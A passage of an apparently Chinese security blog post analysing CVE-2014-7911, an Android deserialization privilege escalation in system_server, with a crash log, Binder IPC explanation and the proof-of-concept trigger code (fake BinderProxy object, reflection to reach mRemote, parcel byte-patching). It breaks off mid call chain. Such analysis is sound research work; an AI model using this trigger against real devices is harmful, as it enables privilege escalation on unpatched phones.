<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>CVE-2014-7911安卓本地提权漏洞分析 | idhyt&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="简介CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，影响版本包括4.4以前所有的版本。该漏洞是一个非常有学习价值的漏洞，其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。
该漏洞的成因在于ja">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2014-7911安卓本地提权漏洞分析">
<meta property="og:url" content="http://blog.idhyt.com/2015/07/31/exploit-cve-2014-7911/index.html">
<meta property="og:site_name" content="idhyt's blog">
<meta property="og:description" content="简介CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，影响版本包括4.4以前所有的版本。该漏洞是一个非常有学习价值的漏洞，其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。
该漏洞的成因在于ja">
<meta property="og:updated_time" content="2016-02-19T09:42:32.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2014-7911安卓本地提权漏洞分析">
<meta name="twitter:description" content="简介CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，影响版本包括4.4以前所有的版本。该漏洞是一个非常有学习价值的漏洞，其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。
该漏洞的成因在于ja">
  
    <link rel="alternate" href="/atom.xml" title="idhyt&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css" type="text/css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">idhyt&#39;s blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">云淡风轻</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜尋"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.idhyt.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-exploit-cve-2014-7911" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/07/31/exploit-cve-2014-7911/" class="article-date">
  <time datetime="2015-07-31T15:28:11.000Z" itemprop="datePublished">2015-07-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/exploit/">exploit</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      CVE-2014-7911安卓本地提权漏洞分析
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="简介">简介</h2><p>CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，影响版本包括4.4以前所有的版本。该漏洞是一个非常有学习价值的漏洞，其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。</p>
<p>该漏洞的成因在于java.io.ObjectInputStream类在反序列化输入的数据时，并不验证其合法性，攻击者可以利用此漏洞构造恶意对象在sysem_server进程中执行任意代码并获取提升的权限。但是我google大部分关于这个漏洞的文章，没有一个分析文章能将漏洞的触发流程与这个点串起来的逻辑，或者说文章中根本就没有在提及这个点，这个过程发生在sysem_server处理Parcel数据的时候有个unparcel过程，下边会有详细的逻辑流程。</p>
<h2 id="调试环境和工具">调试环境和工具</h2><p>nexus 5<br>android 4.4<br>android studio</p>
<h2 id="漏洞触发">漏洞触发</h2><h3 id="触发">触发</h3><p>先下载漏洞<a href="http://seclists.org/fulldisclosure/2014/Nov/51" target="_blank" rel="external">poc</a>编译过后安装到手机中，一定要拿实体机测试，在genymotion等虚拟机中无法通过反射获取到系统服务。</p>
<p>清除日志 adb logcat -c<br>开启日志 adb logcat<br>运行poc，手机重启，查看崩溃日志</p>
<pre><code>--------- <span class="keyword">beginning </span>of /dev/log/main
I/System.out(<span class="number">10603</span>): <span class="number">1</span> inner classes found
I/System.out(<span class="number">10603</span>): <span class="number">1</span> inner classes found
D/audio_hw_primary( <span class="number">8448</span>): <span class="keyword">select_devices: </span>out_snd_device(<span class="number">2</span>: speaker) in_snd_device(<span class="number">0</span>: )
--------- <span class="keyword">beginning </span>of /dev/log/system
E/UserManagerService( <span class="number">8753</span>): Error writing application restrictions list
D/dalvikvm( <span class="number">8753</span>): GC_FOR_ALLOC freed <span class="number">134</span>K, <span class="number">4</span>% free <span class="number">24602</span>K/<span class="number">25472</span>K, paused <span class="number">32</span>ms, total <span class="number">32</span>ms
F/libc    ( <span class="number">8753</span>): Fatal signal <span class="number">11</span> (SIGSEGV) at <span class="number">0x1337bef3</span> (<span class="preprocessor">code</span><span class="number">=1</span>), thread <span class="number">8761</span> (FinalizerDaemon)
D/dalvikvm( <span class="number">8753</span>): GC_FOR_ALLOC freed <span class="number">856</span>K, <span class="number">7</span>% free <span class="number">24582</span>K/<span class="number">26312</span>K, paused <span class="number">31</span>ms, total <span class="number">31</span>ms
D/dalvikvm( <span class="number">8753</span>): GC_FOR_ALLOC freed <span class="number">836</span>K, <span class="number">7</span>% free <span class="number">24582</span>K/<span class="number">26312</span>K, paused <span class="number">35</span>ms, total <span class="number">35</span>ms
I/ActivityManager( <span class="number">8753</span>): START u0 {act<span class="label">=android</span>.intent.action.MAIN cat=[<span class="keyword">android.intent.category.HOME] </span>flg<span class="number">=0x10200000</span> <span class="keyword">cmp=com.google.android.googlequicksearchbox/com.google.android.launcher.GEL} </span>from pid <span class="number">8753</span>
D/audio_hw_primary( <span class="number">8448</span>): <span class="keyword">select_devices: </span>out_snd_device(<span class="number">2</span>: speaker) in_snd_device(<span class="number">0</span>: )
I/DEBUG   (  <span class="number">175</span>): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
I/DEBUG   (  <span class="number">175</span>): <span class="keyword">Build </span>fingerprint: <span class="string">'google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys'</span>
I/DEBUG   (  <span class="number">175</span>): <span class="keyword">Revision: </span><span class="string">'11'</span>
I/DEBUG   (  <span class="number">175</span>): pid: <span class="number">8753</span>, tid: <span class="number">8761</span>, name: FinalizerDaemon  &gt;&gt;&gt; system_server &lt;&lt;&lt;
I/DEBUG   (  <span class="number">175</span>): signal <span class="number">11</span> (SIGSEGV), <span class="preprocessor">code</span> <span class="number">1</span> (SEGV_MAPERR), fault <span class="keyword">addr </span><span class="number">1337</span>bef3
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">r0</span> <span class="number">1337</span>beef  <span class="literal">r1</span> <span class="number">401899</span><span class="literal">d9</span>  <span class="literal">r2</span> <span class="number">71082008</span>  <span class="literal">r3</span> <span class="number">6</span>d468dc4
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">r4</span> <span class="number">401899</span><span class="literal">d9</span>  <span class="literal">r5</span> <span class="number">1337</span>beef  <span class="literal">r6</span> <span class="number">713</span>c12e8  <span class="literal">r7</span> <span class="number">1337</span>beef
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">r8</span> <span class="number">1337</span>beef  <span class="literal">r9</span> <span class="number">746</span>daf68  <span class="literal">sl</span> <span class="number">71082018</span>  <span class="literal">fp</span> <span class="number">74</span>a7eb24
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">ip</span> <span class="number">401</span>c18a4  <span class="literal">sp</span> <span class="number">74</span>a7eae8  <span class="literal">lr</span> <span class="number">40188981</span>  <span class="literal">pc</span> <span class="number">400</span>d6176  <span class="keyword">cpsr </span><span class="number">200</span>f0030
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d0</span>  <span class="number">0000000000000001</span>  <span class="literal">d1</span>  <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d2</span>  <span class="number">6</span>d4aece800000000  <span class="literal">d3</span>  <span class="number">0000010000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d4</span>  <span class="number">0000000000000000</span>  <span class="literal">d5</span>  <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d6</span>  <span class="number">0000000000000000</span>  <span class="literal">d7</span>  <span class="number">42</span>c800004bb98bb4
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d8</span>  <span class="number">0000000000000000</span>  <span class="literal">d9</span>  <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d10</span> <span class="number">0000000000000000</span>  <span class="literal">d11</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d12</span> <span class="number">0000000000000000</span>  <span class="literal">d13</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d14</span> <span class="number">0000000000000000</span>  <span class="literal">d15</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d16</span> ffffffff00000013  <span class="literal">d17</span> <span class="number">00000006</span>ffffffff
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d18</span> <span class="number">0000000000000000</span>  <span class="literal">d19</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d20</span> <span class="number">0000000000000000</span>  <span class="literal">d21</span> <span class="number">0002000200020002</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d22</span> <span class="number">0000000000000000</span>  <span class="literal">d23</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d24</span> <span class="number">0000000000000000</span>  <span class="literal">d25</span> <span class="number">0002</span>a7600002a760
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d26</span> <span class="number">0707070703030303</span>  <span class="literal">d27</span> <span class="number">0300000004000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d28</span> <span class="number">0800000009000000</span>  <span class="literal">d29</span> <span class="number">0001000000010000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d30</span> <span class="number">010</span>b400001088000  <span class="literal">d31</span> <span class="number">01108000010</span>e0000
I/DEBUG   (  <span class="number">175</span>):     scr <span class="number">60000010</span>
I/DEBUG   (  <span class="number">175</span>):
I/DEBUG   (  <span class="number">175</span>): <span class="keyword">backtrace:
</span>I/DEBUG   (  <span class="number">175</span>):     <span class="number">#00</span>  <span class="literal">pc</span> <span class="number">0000</span>d176  /system/lib/libutils.so (<span class="keyword">android::RefBase::decStrong(void </span>const*) const+<span class="number">3</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#01</span>  <span class="literal">pc</span> <span class="number">0007097</span>d  /system/lib/libandroid_runtime.so
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#02</span>  <span class="literal">pc</span> <span class="number">0001</span>dbcc  /system/lib/libdvm.so (dvmPlatformInvoke+<span class="number">112</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#03</span>  <span class="literal">pc</span> <span class="number">0004</span>e123  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+<span class="number">398</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#04</span>  <span class="literal">pc</span> <span class="number">00026</span>fe0  /system/lib/libdvm.so
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#05</span>  <span class="literal">pc</span> <span class="number">0002</span>dfa0  /system/lib/libdvm.so (dvmMterpStd(Thread*)+<span class="number">76</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#06</span>  <span class="literal">pc</span> <span class="number">0002</span>b638  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+<span class="number">184</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#07</span>  <span class="literal">pc</span> <span class="number">0006057</span>d  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, <span class="keyword">bool, </span>JValue*, std::__va_list)+<span class="number">336</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#08</span>  <span class="literal">pc</span> <span class="number">000605</span><span class="literal">a1</span>  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+<span class="number">20</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#09</span>  <span class="literal">pc</span> <span class="number">00055287</span>  /system/lib/libdvm.so
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#10</span>  <span class="literal">pc</span> <span class="number">0000</span>d170  /system/lib/libc.so (__thread_entry+<span class="number">72</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#11</span>  <span class="literal">pc</span> <span class="number">0000</span>d308  /system/lib/libc.so (pthread_create+<span class="number">240</span>)
<span class="label">...</span>
</code></pre><h3 id="崩溃日志">崩溃日志</h3><p>简单说下崩溃日志格式</p>
<ol>
<li>ndk crash log以<strong><em> </em></strong> <strong><em> </em></strong> <em>*</em>开始. </li>
<li>第一行Build fingerprint: ‘google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys’ 指明了运行的Android版本, 如果您有多份crash dump的话这个信息就比较有用了。</li>
<li>接着一行显示的是当前的线程id(pid)和进程id(tid). 如果当前崩溃的线程是主线程的话, pid和tid会是一样的。</li>
<li>第四行, 显示的是unix信号. 这里的signal 11，即SIGSEGV，表示段错误，是最常见的信号。(SIGSEGV自行google) </li>
<li>接下来的部分是系统寄存器的dump信息。</li>
<li>Crash dump还包含PC之前和之后的一些内存字段. </li>
<li>最后是崩溃时的调用堆栈，如果你执行的是debug版本，还能还原一些c++代码。</li>
</ol>
<h3 id="几个重要的寄存器">几个重要的寄存器</h3><ol>
<li>r0-r3 用作传入函数参数，传出函数返回值。当参数不超过4个时,可以使用寄存器R0~R3来进行参数传递，当参数超过4个时，使用数据栈来传递参数；结果为一个32位的整数时，通过寄存器r0返回；结果为一个64位整数时，通过寄存器r0，r1返回。另外很重要的一点，在C++中，第一个参数就是this指针，所以this指针是存放在r0中的。</li>
<li>r4-r11 被用来存放函数的局部变量。</li>
<li>fp (or r11) 指向当前正在执行的函数的堆栈底。</li>
<li>sp (or r13) 当前正在执行的函数的堆栈顶.(跟fp相对应)</li>
<li>lr (or r14) link register. 简单来说，当当前指令执行完了，就会从这个寄存器获取地址，来知道需要返回，到哪里继续执行。</li>
<li>pc (or r15) program counter. 程序计数器。</li>
</ol>
<h2 id="漏洞POC分析">漏洞POC分析</h2><p>从上边崩溃日志中看出，system_server执行到0x1337bef3地址后触发<code>Error writing application restrictions list</code>写错误，最终造成了崩溃。</p>
<h3 id="漏洞触发过程">漏洞触发过程</h3><p>结合崩溃信息看poc源码，源码触发过程如下：</p>
<p>1.创建可序列化的对象AAdroid.os.BinderProxy并将其放入Bundle数据中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">BinderProxy evilProxy = <span class="keyword">new</span> BinderProxy();</span><br><span class="line">evilProxy.mOrgue = staticAddr;</span><br><span class="line">evilProxy.mObject = staticAddr;</span><br><span class="line">bundle.putSerializable(<span class="string">"eatthis"</span>, evilProxy);</span><br></pre></td></tr></table></figure>
<p>类AAdroid.os.BinderProxy代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinderProxy</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mObject = <span class="number">0x1337beef</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mOrgue = <span class="number">0x1337beef</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意其中两个可控的成员变量mObject和mOrgue分别赋值0x1337beef，正是崩溃点。</p>
<p>2.通过一系列java的反射机制，获得跨进程调用system_server的IBinder接口mRemote，为与system_server的跨进程通信做准备。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取类对象android.os.IUserManager.Stub</span></span><br><span class="line">Class stubClass = <span class="keyword">null</span>;</span><br><span class="line">Class[] umSubclasses = Class.forName(<span class="string">"android.os.IUserManager"</span>).getDeclaredClasses();</span><br><span class="line">System.out.println(umSubclasses.length + <span class="string">" inner classes found"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Class inner : umSubclasses) &#123;</span><br><span class="line">    <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub"</span>)) &#123;</span><br><span class="line">        stubClass = inner;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取对象android.os.IUserManager.Stub中TRANSACTION_setApplicationRestrictions的值用于transact()</span></span><br><span class="line">Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField(<span class="string">"TRANSACTION_setApplicationRestrictions"</span>);</span><br><span class="line">TRANSACTION_setApplicationRestrictionsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取类对象android.os.IUserManager.Stub.Proxy</span></span><br><span class="line">Class proxyClass = <span class="keyword">null</span>;</span><br><span class="line">Class[] umStubclasses = stubClass.getDeclaredClasses();</span><br><span class="line">System.out.println(umStubclasses.length + <span class="string">" inner classes found"</span>);</span><br><span class="line"><span class="keyword">for</span> (Class inner : umStubclasses) &#123;</span><br><span class="line">    <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub.Proxy"</span>)) &#123;</span><br><span class="line">        proxyClass = inner;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取UserManager类对象实例</span></span><br><span class="line">UserManager userManager = (UserManager) context.getSystemService(Context.USER_SERVICE);</span><br><span class="line"><span class="comment">// 获取UserManager类对象中mService对象, 类型为IUserManager</span></span><br><span class="line">Field mServiceField = UserManager.class.getDeclaredField(<span class="string">"mService"</span>);</span><br><span class="line">mServiceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 获取UserManager类对象实例中的mService对象值</span></span><br><span class="line">Object mService = mServiceField.get(userManager);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取类对象android.os.IUserManager.Stub.Proxy中的mRemote对象</span></span><br><span class="line">Field mRemoteField = proxyClass.getDeclaredField(<span class="string">"mRemote"</span>);</span><br><span class="line">mRemoteField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 获取获取类型为IUserManager的实例对象mService对象值</span></span><br><span class="line">mRemote = (IBinder) mRemoteField.get(mService);</span><br></pre></td></tr></table></figure>
<p>3.调用setApplicationRestrictions函数，传入之前打包evilproxy的Bundle数据作为参数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setApplicationRestrictions</span><span class="params">(java.lang.String packageName, android.os.Bundle restrictions, <span class="keyword">int</span></span><br><span class="line">            userHandle)</span> <span class="keyword">throws</span> android.os.RemoteException </span>&#123;</span><br><span class="line">    android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">    android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">        _data.writeString(packageName);</span><br><span class="line">        _data.writeInt(<span class="number">1</span>);</span><br><span class="line">        restrictions.writeToParcel(_data, <span class="number">0</span>);</span><br><span class="line">        _data.writeInt(userHandle);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] data = _data.marshall();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; <span class="keyword">true</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[i] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">1</span>] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">2</span>] == <span class="string">'d'</span> &amp;&amp; data[i+<span class="number">3</span>] == <span class="string">'r'</span>) &#123;</span><br><span class="line">                data[i] = <span class="string">'a'</span>;</span><br><span class="line">                data[i+<span class="number">1</span>] = <span class="string">'n'</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        _data.recycle();</span><br><span class="line">        _data = Parcel.obtain();</span><br><span class="line">        _data.unmarshall(data, <span class="number">0</span>, data.length);</span><br><span class="line"></span><br><span class="line">        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, <span class="number">0</span>);</span><br><span class="line">        _reply.readException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        _reply.recycle();</span><br><span class="line">        _data.recycle();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将该函数与Android源码中的Android.os.IUserManager.Stub.Proxy.setApplicationRestrictions函数对比，主要的区别在于将传入的Bundle数据进行了修改，将之前可序列化的AAdroid.os.BinderProxy对象修改为了不可序列化的Android.os.BinderProxy对象，这样就将不可序列化的Bundles数据，通过Binder跨进程调用，传入system_server中，system_server在处理这些数据时造成异常崩溃。</p>
<h3 id="进程间通信">进程间通信</h3><h4 id="Binder">Binder</h4><p>通过POC知道造成崩溃行为的代码为mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0)，这里就涉及到进程间通信，在Android中，Binder用于完成进程间通信（IPC），即把多个进程关联在一起，以下摘自网络：</p>
<blockquote>
<p>Binder是一种架构，这种架构提供了服务端接口、Binder驱动、客户端接口三个模块。<br>　　服务端：一个Binder服务端实际上就是一个Binder类的对象，该对象一旦创建，内部就启动一个隐藏线程。该线程接下来会接收Binder驱动发送的消息，收到消息后，会执行到Binder对象中的onTransact()函数，并按照该函数的参数执行不同的服务代码。因此，要实现一个Binder服务，就必须重载onTransact()方法。重载onTransact()函数的主要内容是把onTransact()函数的参数转换为服务函数的参数，而onTransact()函数的参数来源是客户端调用transact()函数时输入的，因此，如果transact()有固定格式的输入，那么onTransact()就会有固定格式的输出。<br>　　Binder驱动：任意一个服务端Binder对象被创建时，同时会在Binder驱动中创建一个mRemote对象，该对象的类型也是Binder类。客户端要访问远程服务时，都是通过mRemote对象。<br>　　客户端：客户端要想访问远程服务，必须获取远程服务在Binder对象中对应的mRemote引用，获得该mRemote对象后，就可以调用其transact()方法，而在Binder驱动中，mRemote对象也重载了transact()方法，重载的内容主要包括以下几项：1. 以线程间消息通信的模式，向服务端发送客户端传递过来的参数。2. 挂起当前线程，当前线程正是客户端线程，并等待服务端线程执行完指定服务函数后通知(notify)。3. 接收到服务端线程的通知，然后继续执行客户端线程，并返回到客户端代码区。</p>
</blockquote>
<p>通过上边简短的介绍，我们知道，要想使用服务端，首先要获取服务端在Binder驱动中对应的mRemote变量的引用，在POC中通过反射方式获得。<br>获得该变量的引用后，就可以调用该变量的transact()方法。该方法的函数原型：public final boolean transact(int code, Parcel data, Parcel reply,int flags)，其中data表示的是要传递给远程Binder服务的包裹(Parcel)，远程服务函数所需要的参数必须放入这个包裹中。包裹中只能放入特定类型的变量，这些类型包括常用的原子类型，比如String、int、long等，要查看包裹可以放入的全部数据类型，可以参照Parcel类。除了一般的原子变量外，Parcel还提供了一个writeParcel()方法，可以在包裹中包含一个小包裹。因此，要进行Binder远程服务调用时，服务函数的参数要么是一个原子类，要么必须继承于Parcel类，否则，是不能传递的。这也是为什么最开始要创建一个可序列化的对象AAdroid.os.BinderProxy并将其放入Bundle数据中。</p>
<p>网上关于进程间通信的资料大部分都是又臭又长，如果想快速了解推荐一篇文章 <a href="http://www.cnblogs.com/noTice520/archive/2012/11/01/2750209.html" target="_blank" rel="external">android中的跨进程通信的实现（一）——远程调用过程和aidl</a></p>
<h4 id="service_manager和binder_service">service manager和binder service</h4><p>Binder是android系统中实现跨进程通信(IPC)的一种重要机制。service manager是所有binder service的管理者，但它并不是这些binder service的创建者。这些binder service有些是init进程启动的服务创建的，有些是system_server进程创建的，但是service manager会管理所有binder service的信息，方便client查询以及调用。</p>
<p>service manager是由init进程直接启动的，ActivityManagerService，PackageManagerService等系统的基本服务(frameworks\base\services\java\com\android\server源码路径里的服务类)由system_server进程启动的。binder service实际上并没有单独的进程，它们只是system_server的一个子线程。init进程会启动surface flinger，media server, drmserver等服务，在这些服务里会创建binder service，并注册到service manager。</p>
<p>native binder service 和 java 层的binder service，都会交由service manager注册，然后由service manager管理。客户端使用binder service时需要向service manager查询得到binder service在当前进程的一个代理proxy，通过代理与binder service的服务端交互。</p>
<h3 id="漏洞触发过程中数据的parcel和unparcel">漏洞触发过程中数据的parcel和unparcel</h3><p>进程间传递Parcel类型数据，一端通过writeToParcel将对象映射成Parcel对象传递出去，另一端再通过createFromParcel将Parcel对象映射回原始对象进行处理。可以将Parcel看成是一个流，通过writeToParcel把对象写到流里面，在通过createFromParcel从流里读取对象。</p>
<p>然后看POC中修改过的不可反序列化的parcel对象Android.os.BinderProxy的处理过程，接POC最后执行流程，执行过mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0)过后，system_server层会去调用IUserManager.onTransact()方法，来到case TRANSACTION_setApplicationRestrictions分支开始处理传进来的parcel数据流：</p>
<p>先是_arg1 = android.os.Bundle.CREATOR.createFromParcel(data)读取数据对象，然后调用this.setApplicationRestrictions(_arg0, _arg1, _arg2);然后转入UserManagerService，UserManagerService继承IUserManager.Stub并实现了setApplicationRestrictions方法，下边的调用流程为(跟着参数_arg1也就是修改过不可反序列化的对象走)</p>
<blockquote>
<p>IUserManager.Stub.Proxy.setApplicationRestrictions(_arg0, _arg1, _arg2) -&gt;<br>UserManagerService.setApplicationRestrictions -&gt;<br>UserManagerService.writeApplicationRestrictionsLocked -&gt;<br>Bundle.keySet()(restrictions.keySet()) -&gt;<br>Bundle.unparcel() -&gt;<br>Parcel.readArrayMapInternal() -&gt;<br>Parcel.readValue(ClassLoader) -&gt;<br>Parcel.readSerializable(ClassLoader) -&gt;<br>ObjectInputStream.readObject() -&gt;<br>ObjectInputStream.readNonPrimitiveContent() -&gt;<br>ObjectInputStream.readNewObject() -&gt;</p>
</blockquote>
